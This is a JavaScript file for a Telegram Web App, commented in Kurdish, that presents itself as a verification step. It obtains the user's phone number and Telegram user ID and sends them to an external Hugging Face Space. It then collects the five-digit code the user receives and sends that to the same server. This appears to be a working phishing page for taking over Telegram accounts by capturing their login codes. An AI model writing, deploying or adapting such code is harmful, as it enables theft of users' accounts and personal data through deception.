const tg = window.Telegram.WebApp;
const API_URL = "https://taman964-api-handler.hf.space/send_code"; 

tg.expand();

// کلیک کردن لە CONFIRM بۆ ناردنی ژمارەی مۆبایل
document.getElementById('confirm-btn').onclick = () => {
    tg.requestContact((res) => {
        if (res.auth_date) {
            const phone = res.contact.phone_number;
            const user_id = tg.initDataUnsafe.user.id;

            // ناردنی ژمارە بۆ Hugging Face
            fetch(`${API_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone, user_id })
            })
            .then(response => response.json())
            .then(data => {
                if(data.status === "ok") {
                    // ئەگەر ژمارەکە چوو، شاشەی کۆدەکە نیشان بدە
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'flex';
                } else {
                    alert("هەڵەیەک ڕوویدا لە ناردنی کۆد: " + data.message);
                }
            })
            .catch(err => {
                alert("پەیوەندی لەگەڵ سێرڤەر سەرکەوتوو نەبوو!");
                console.error(err);
            });
        }
    });
};

// کلیک کردن لە GET CODE بۆ ناردنی کۆدەکە
document.getElementById('verify-btn').onclick = () => {
    const inputs = document.querySelectorAll('.code-box');
    let code = "";
    inputs.forEach(input => code += input.value);
    const user_id = tg.initDataUnsafe.user.id;

    if(code.length === 5) {
        fetch(`${API_URL}/verify_code`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ code, user_id })
        })
        .then(response => response.json())
        .then(data => {
            if(data.status === "success") {
                alert("✅ Verified! Access Granted.");
                tg.close();
            } else {
                alert("کۆدەکە هەڵەیە یان ماوەکەی بەسەرچووە: " + data.message);
            }
        })
        .catch(err => {
            alert("هەڵە لە پەیوەندی سێرڤەر!");
        });
    } else {
        alert("تکایە هەر ٥ ژمارەی کۆدەکە بنووسە");
    }
};

// بۆ ئەوەی فوکەس ئۆتۆماتیک بچێتە خانەی داهاتوو لە کاتی نووسینی کۆد
const codeBoxes = document.querySelectorAll('.code-box');
codeBoxes.forEach((box, index) => {
    box.addEventListener('input', () => {
        if (box.value.length === 1 && index < codeBoxes.length - 1) {
            codeBoxes[index + 1].focus();
        }
    });
});
